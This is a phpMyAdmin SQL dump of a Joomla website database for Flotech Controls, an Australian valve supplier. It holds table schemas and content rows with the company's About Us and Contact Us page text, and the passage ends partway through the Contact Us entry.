-- phpMyAdmin SQL Dump
-- version 4.0.10.9
-- http://www.phpmyadmin.net
--
-- Host: localhost
-- Generation Time: Apr 08, 2015 at 06:03 PM
-- Server version: 5.5.42-37.1
-- PHP Version: 5.3.3

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8 */;

--
-- Database: `flotechdev`
--

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_assets`
--

CREATE TABLE IF NOT EXISTS `j6kpf_assets` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT COMMENT 'Primary Key',
  `parent_id` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set parent.',
  `lft` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set lft.',
  `rgt` int(11) NOT NULL DEFAULT '0' COMMENT 'Nested set rgt.',
  `level` int(10) unsigned NOT NULL COMMENT 'The cached level in the nested tree.',
  `name` varchar(50) NOT NULL COMMENT 'The unique name for the asset.\n',
  `title` varchar(100) NOT NULL COMMENT 'The descriptive title for the asset.',
  `rules` varchar(5120) NOT NULL COMMENT 'JSON encoded access control.',
  PRIMARY KEY (`id`),
  UNIQUE KEY `idx_asset_name` (`name`),
  KEY `idx_lft_rgt` (`lft`,`rgt`),
  KEY `idx_parent_id` (`parent_id`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=56 ;

--
-- Dumping data for table `j6kpf_assets`
--

INSERT INTO `j6kpf_assets` (`id`, `parent_id`, `lft`, `rgt`, `level`, `name`, `title`, `rules`) VALUES
(1, 0, 0, 107, 0, 'root.1', 'Root Asset', '{"core.login.site":{"6":1,"2":1},"core.login.admin":{"6":1},"core.login.offline":{"6":1},"core.admin":{"8":1},"core.manage":{"7":1},"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(2, 1, 1, 2, 1, 'com_admin', 'com_admin', '{}'),
(3, 1, 3, 6, 1, 'com_banners', 'com_banners', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(4, 1, 7, 8, 1, 'com_cache', 'com_cache', '{"core.admin":{"7":1},"core.manage":{"7":1}}'),
(5, 1, 9, 10, 1, 'com_checkin', 'com_checkin', '{"core.admin":{"7":1},"core.manage":{"7":1}}'),
(6, 1, 11, 12, 1, 'com_config', 'com_config', '{}'),
(7, 1, 13, 16, 1, 'com_contact', 'com_contact', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(8, 1, 17, 52, 1, 'com_content', 'com_content', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":{"3":1},"core.delete":[],"core.edit":{"4":1},"core.edit.state":{"5":1},"core.edit.own":[]}'),
(9, 1, 53, 54, 1, 'com_cpanel', 'com_cpanel', '{}'),
(10, 1, 55, 56, 1, 'com_installer', 'com_installer', '{"core.admin":[],"core.manage":{"7":0},"core.delete":{"7":0},"core.edit.state":{"7":0}}'),
(11, 1, 57, 58, 1, 'com_languages', 'com_languages', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(12, 1, 59, 60, 1, 'com_login', 'com_login', '{}'),
(13, 1, 61, 62, 1, 'com_mailto', 'com_mailto', '{}'),
(14, 1, 63, 64, 1, 'com_massmail', 'com_massmail', '{}'),
(15, 1, 65, 66, 1, 'com_media', 'com_media', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":{"3":1},"core.delete":{"5":1}}'),
(16, 1, 67, 68, 1, 'com_menus', 'com_menus', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(17, 1, 69, 70, 1, 'com_messages', 'com_messages', '{"core.admin":{"7":1},"core.manage":{"7":1}}'),
(18, 1, 71, 72, 1, 'com_modules', 'com_modules', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(19, 1, 73, 76, 1, 'com_newsfeeds', 'com_newsfeeds', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(20, 1, 77, 78, 1, 'com_plugins', 'com_plugins', '{"core.admin":{"7":1},"core.manage":[],"core.edit":[],"core.edit.state":[]}'),
(21, 1, 79, 80, 1, 'com_redirect', 'com_redirect', '{"core.admin":{"7":1},"core.manage":[]}'),
(22, 1, 81, 82, 1, 'com_search', 'com_search', '{"core.admin":{"7":1},"core.manage":{"6":1}}'),
(23, 1, 83, 84, 1, 'com_templates', 'com_templates', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(24, 1, 85, 88, 1, 'com_users', 'com_users', '{"core.admin":{"7":1},"core.manage":[],"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(25, 1, 89, 92, 1, 'com_weblinks', 'com_weblinks', '{"core.admin":{"7":1},"core.manage":{"6":1},"core.create":{"3":1},"core.delete":[],"core.edit":{"4":1},"core.edit.state":{"5":1},"core.edit.own":[]}'),
(26, 1, 93, 94, 1, 'com_wrapper', 'com_wrapper', '{}'),
(27, 8, 18, 19, 2, 'com_content.category.2', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(28, 3, 4, 5, 2, 'com_banners.category.3', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(29, 7, 14, 15, 2, 'com_contact.category.4', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(30, 19, 74, 75, 2, 'com_newsfeeds.category.5', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(31, 25, 90, 91, 2, 'com_weblinks.category.6', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[],"core.edit.own":[]}'),
(32, 24, 86, 87, 1, 'com_users.category.7', 'Uncategorised', '{"core.create":[],"core.delete":[],"core.edit":[],"core.edit.state":[]}'),
(33, 1, 95, 96, 1, 'com_finder', 'com_finder', '{"core.admin":{"7":1},"core.manage":{"6":1}}'),
(34, 1, 97, 98, 1, 'com_joomlaupdate', 'com_joomlaupdate', '{"core.admin":[],"core.manage":[],"core.delete":[],"core.edit.state":[]}'),
(35, 1, 99, 100, 1, 'com_jce', 'jce', '{}'),
(36, 8, 20, 51, 2, 'com_content.category.8', 'public', '{"core.create":{"6":1,"3":1},"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1},"core.edit.own":{"6":1,"3":1}}'),
(37, 36, 21, 22, 3, 'com_content.article.1', 'About Us', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(38, 36, 23, 24, 3, 'com_content.article.2', 'Contact Us', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(39, 36, 25, 26, 3, 'com_content.article.3', 'Noreva', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(40, 1, 101, 102, 1, 'com_sexycontactform', 'sexycontactform', '{}'),
(41, 36, 27, 28, 3, 'com_content.article.4', 'RED VALVE', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(42, 36, 29, 30, 3, 'com_content.article.5', 'TIDEFLEX', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(43, 36, 31, 32, 3, 'com_content.article.6', 'Wey', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(44, 1, 103, 104, 1, 'com_foxcontact', 'com_foxcontact', '{}'),
(45, 36, 33, 34, 3, 'com_content.article.7', 'SOR', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(46, 36, 35, 36, 3, 'com_content.article.8', 'Valvtechnologies', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(47, 36, 37, 38, 3, 'com_content.article.9', 'Birkett', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(48, 36, 39, 40, 3, 'com_content.article.10', 'Power', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(49, 36, 41, 42, 3, 'com_content.article.11', 'Mining', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(50, 36, 43, 44, 3, 'com_content.article.12', 'Water', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(51, 36, 45, 46, 3, 'com_content.article.13', 'Oil and Gas', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(52, 36, 47, 48, 3, 'com_content.article.14', 'MTS', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(53, 36, 49, 50, 3, 'com_content.article.15', 'Copes - Vulcan', '{"core.delete":{"6":1},"core.edit":{"6":1,"4":1},"core.edit.state":{"6":1,"5":1}}'),
(55, 1, 105, 106, 1, 'com_uniterevolution', 'com_uniterevolution', '{}');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_associations`
--

CREATE TABLE IF NOT EXISTS `j6kpf_associations` (
  `id` int(11) NOT NULL COMMENT 'A reference to the associated item.',
  `context` varchar(50) NOT NULL COMMENT 'The context of the associated item.',
  `key` char(32) NOT NULL COMMENT 'The key for the association computed from an md5 on associated ids.',
  PRIMARY KEY (`context`,`id`),
  KEY `idx_key` (`key`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_banner_clients`
--

CREATE TABLE IF NOT EXISTS `j6kpf_banner_clients` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `contact` varchar(255) NOT NULL DEFAULT '',
  `email` varchar(255) NOT NULL DEFAULT '',
  `extrainfo` text NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `metakey` text NOT NULL,
  `own_prefix` tinyint(4) NOT NULL DEFAULT '0',
  `metakey_prefix` varchar(255) NOT NULL DEFAULT '',
  `purchase_type` tinyint(4) NOT NULL DEFAULT '-1',
  `track_clicks` tinyint(4) NOT NULL DEFAULT '-1',
  `track_impressions` tinyint(4) NOT NULL DEFAULT '-1',
  PRIMARY KEY (`id`),
  KEY `idx_own_prefix` (`own_prefix`),
  KEY `idx_metakey_prefix` (`metakey_prefix`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_banner_tracks`
--

CREATE TABLE IF NOT EXISTS `j6kpf_banner_tracks` (
  `track_date` datetime NOT NULL,
  `track_type` int(10) unsigned NOT NULL,
  `banner_id` int(10) unsigned NOT NULL,
  `count` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`track_date`,`track_type`,`banner_id`),
  KEY `idx_track_date` (`track_date`),
  KEY `idx_track_type` (`track_type`),
  KEY `idx_banner_id` (`banner_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_banners`
--

CREATE TABLE IF NOT EXISTS `j6kpf_banners` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `cid` int(11) NOT NULL DEFAULT '0',
  `type` int(11) NOT NULL DEFAULT '0',
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `imptotal` int(11) NOT NULL DEFAULT '0',
  `impmade` int(11) NOT NULL DEFAULT '0',
  `clicks` int(11) NOT NULL DEFAULT '0',
  `clickurl` varchar(200) NOT NULL DEFAULT '',
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `description` text NOT NULL,
  `custombannercode` varchar(2048) NOT NULL,
  `sticky` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `params` text NOT NULL,
  `own_prefix` tinyint(1) NOT NULL DEFAULT '0',
  `metakey_prefix` varchar(255) NOT NULL DEFAULT '',
  `purchase_type` tinyint(4) NOT NULL DEFAULT '-1',
  `track_clicks` tinyint(4) NOT NULL DEFAULT '-1',
  `track_impressions` tinyint(4) NOT NULL DEFAULT '-1',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `reset` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `language` char(7) NOT NULL DEFAULT '',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `idx_state` (`state`),
  KEY `idx_own_prefix` (`own_prefix`),
  KEY `idx_metakey_prefix` (`metakey_prefix`),
  KEY `idx_banner_catid` (`catid`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_categories`
--

CREATE TABLE IF NOT EXISTS `j6kpf_categories` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `lft` int(11) NOT NULL DEFAULT '0',
  `rgt` int(11) NOT NULL DEFAULT '0',
  `level` int(10) unsigned NOT NULL DEFAULT '0',
  `path` varchar(255) NOT NULL DEFAULT '',
  `extension` varchar(50) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `description` mediumtext NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `metadesc` varchar(1024) NOT NULL COMMENT 'The meta description for the page.',
  `metakey` varchar(1024) NOT NULL COMMENT 'The meta keywords for the page.',
  `metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  PRIMARY KEY (`id`),
  KEY `cat_idx` (`extension`,`published`,`access`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_path` (`path`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `j6kpf_categories`
--

INSERT INTO `j6kpf_categories` (`id`, `asset_id`, `parent_id`, `lft`, `rgt`, `level`, `path`, `extension`, `title`, `alias`, `note`, `description`, `published`, `checked_out`, `checked_out_time`, `access`, `params`, `metadesc`, `metakey`, `metadata`, `created_user_id`, `created_time`, `modified_user_id`, `modified_time`, `hits`, `language`, `version`) VALUES
(1, 0, 0, 0, 15, 0, '', 'system', 'ROOT', 'root', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{}', '', '', '', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(2, 27, 1, 1, 2, 1, 'uncategorised', 'com_content', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(3, 28, 1, 3, 4, 1, 'uncategorised', 'com_banners', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":"","foobar":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(4, 29, 1, 5, 6, 1, 'uncategorised', 'com_contact', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(5, 30, 1, 7, 8, 1, 'uncategorised', 'com_newsfeeds', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(6, 31, 1, 9, 10, 1, 'uncategorised', 'com_weblinks', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(7, 32, 1, 11, 12, 1, 'uncategorised', 'com_users', 'Uncategorised', 'uncategorised', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"target":"","image":""}', '', '', '{"page_title":"","author":"","robots":""}', 42, '2011-01-01 00:00:01', 0, '0000-00-00 00:00:00', 0, '*', 1),
(8, 36, 1, 13, 14, 1, 'public', 'com_content', 'public', 'public', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{"category_layout":"","image":""}', '', '', '{"author":"","robots":""}', 32, '2013-04-16 02:39:52', 0, '0000-00-00 00:00:00', 1097, '*', 1);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_contact_details`
--

CREATE TABLE IF NOT EXISTS `j6kpf_contact_details` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `name` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `con_position` varchar(255) DEFAULT NULL,
  `address` text,
  `suburb` varchar(100) DEFAULT NULL,
  `state` varchar(100) DEFAULT NULL,
  `country` varchar(100) DEFAULT NULL,
  `postcode` varchar(100) DEFAULT NULL,
  `telephone` varchar(255) DEFAULT NULL,
  `fax` varchar(255) DEFAULT NULL,
  `misc` mediumtext,
  `image` varchar(255) DEFAULT NULL,
  `email_to` varchar(255) DEFAULT NULL,
  `default_con` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `user_id` int(11) NOT NULL DEFAULT '0',
  `catid` int(11) NOT NULL DEFAULT '0',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `mobile` varchar(255) NOT NULL DEFAULT '',
  `webpage` varchar(255) NOT NULL DEFAULT '',
  `sortname1` varchar(255) NOT NULL,
  `sortname2` varchar(255) NOT NULL,
  `sortname3` varchar(255) NOT NULL,
  `language` char(7) NOT NULL,
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if article is featured.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`published`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8 AUTO_INCREMENT=1 ;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_contact_templates`
--

CREATE TABLE IF NOT EXISTS `j6kpf_contact_templates` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=7 ;

--
-- Dumping data for table `j6kpf_contact_templates`
--

INSERT INTO `j6kpf_contact_templates` (`id`, `name`) VALUES
(1, 'Gray'),
(2, 'Black'),
(3, 'Blue'),
(4, 'Red'),
(5, 'Orange'),
(6, 'Poison Green');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_content`
--

CREATE TABLE IF NOT EXISTS `j6kpf_content` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `asset_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'FK to the #__assets table.',
  `title` varchar(255) NOT NULL DEFAULT '',
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `introtext` mediumtext NOT NULL,
  `fulltext` mediumtext NOT NULL,
  `state` tinyint(3) NOT NULL DEFAULT '0',
  `catid` int(10) unsigned NOT NULL DEFAULT '0',
  `created` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by` int(10) unsigned NOT NULL DEFAULT '0',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `modified_by` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out` int(10) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `images` text NOT NULL,
  `urls` text NOT NULL,
  `attribs` varchar(5120) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `ordering` int(11) NOT NULL DEFAULT '0',
  `metakey` text NOT NULL,
  `metadesc` text NOT NULL,
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `metadata` text NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL DEFAULT '0' COMMENT 'Set if article is featured.',
  `language` char(7) NOT NULL COMMENT 'The language code for the article.',
  `xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  PRIMARY KEY (`id`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_state` (`state`),
  KEY `idx_catid` (`catid`),
  KEY `idx_createdby` (`created_by`),
  KEY `idx_featured_catid` (`featured`,`catid`),
  KEY `idx_language` (`language`),
  KEY `idx_xreference` (`xreference`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=16 ;

--
-- Dumping data for table `j6kpf_content`
--

INSERT INTO `j6kpf_content` (`id`, `asset_id`, `title`, `alias`, `introtext`, `fulltext`, `state`, `catid`, `created`, `created_by`, `created_by_alias`, `modified`, `modified_by`, `checked_out`, `checked_out_time`, `publish_up`, `publish_down`, `images`, `urls`, `attribs`, `version`, `ordering`, `metakey`, `metadesc`, `access`, `hits`, `metadata`, `featured`, `language`, `xreference`) VALUES
(1, 37, 'About Us', 'about-us', '<p>Flotech Controls Pty Limited was incorporated in 1991 and we have grown our business by understanding our customers’ needs in supplying severe service solutions to isolation and control valve applications.</p>\r\n<p>We have built our business on focussing in “best in class” valve solutions across the mining, power, oil and gas and water industries. Whether it is a very abrasive or corrosive slurry or high pressure, high temperature power applications, water hammer, desalination or wastewater treatment, Flotech has always listened to your, the customer, needs.</p>\r\n<p>Our focus is in providing the best solution in selecting a valve that ultimately delivers the lowest cost of ownership through reduced maintenance, reliability and expectation of operation.</p>\r\n<p>Our team of sales engineers and support have a wealth of process and application knowledge ensuring that we always select the right valve for the application and provide the highest level of support in ensuring your continuous operations.</p>\r\n<p>&nbsp;</p>\r\n<p><a href="/application-sectors/mining"><img alt="home-1-mining" src="images/newimages/homepageboxes/home-1-mining.jpg" height="49" width="153" /></a><a href="/application-sectors/oil-and-gas"> <img alt="home-2-oil-and-gas" src="images/newimages/homepageboxes/home-2-oil-and-gas.jpg" height="48" width="152" /></a><a href="/application-sectors/water"> <img alt="home-3-water" src="images/newimages/homepageboxes/home-3-water.jpg" height="48" width="150" /></a><a href="/application-sectors/power"> <img alt="home-4-power" src="images/newimages/homepageboxes/home-4-power.jpg" height="48" width="150" /></a></p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>\r\n<p>&nbsp;</p>', '', 1, 8, '2013-04-16 02:41:48', 32, '', '2013-06-24 04:26:10', 32, 0, '0000-00-00 00:00:00', '2013-04-16 02:41:48', '0000-00-00 00:00:00', '{"image_intro":"","float_intro":"","image_intro_alt":"","image_intro_caption":"","image_fulltext":"","float_fulltext":"","image_fulltext_alt":"","image_fulltext_caption":""}', '{"urla":null,"urlatext":"","targeta":"","urlb":null,"urlbtext":"","targetb":"","urlc":null,"urlctext":"","targetc":""}', '{"show_title":"1","link_titles":"","show_tags":"","show_intro":"","info_block_position":"","show_category":"","link_category":"","show_parent_category":"","link_parent_category":"","show_author":"","link_author":"","show_create_date":"","show_modify_date":"","show_publish_date":"","show_item_navigation":"","show_icons":"","show_print_icon":"","show_email_icon":"","show_vote":"","show_hits":"","show_noauth":"","urls_position":"","alternative_readmore":"","article_layout":"","show_publishing_options":"","show_article_options":"","show_urls_images_backend":"","show_urls_images_frontend":""}', 8, 14, '', '', 1, 3557, '{"robots":"","author":"","rights":"","xreference":"","tags":null}', 0, '*', ''),
(2, 38, 'Contact Us', 'contact-us', '<p>At Flotech Controls we are focussed on delivering the best solutions in meeting your needs.</p>\r\n<p style="text-indent: -18pt;"><span><span>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -<span style="font: 7pt ''Times New Roman'';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>Carefully selected against your requirements</p>\r\n<p style="text-indent: -18pt;"><span><span>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp;&nbsp;&nbsp; -<span style="font: 7pt ''Times New Roman'';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>Lowest total cost of ownership always top priority</p>\r\n<p style="text-indent: -18pt;"><span><span>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; -<span style="font: 7pt ''Times New Roman'';">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; </span></span></span>Engineered solutions for severe service appications</p>\r\n<p>Email inquiries:&nbsp;&nbsp; info [@] flotechcontrols.com</p>\r\n<p><strong>&nbsp;</strong></p>\r\n<p><strong>Head Office</strong></p>\r\n<p>&nbsp;&nbsp;&nbsp; Unit 4, 1 Anderson Street</p>\r\n<p>&nbsp;&nbsp;&nbsp; Botany, NSW 2019</p>\r\n<p>&nbsp;&nbsp;&nbsp; Telephone +61 2 9949 4888</p>\r\n<p>&nbsp;&nbsp;&nbsp; Fax +61 2 9949 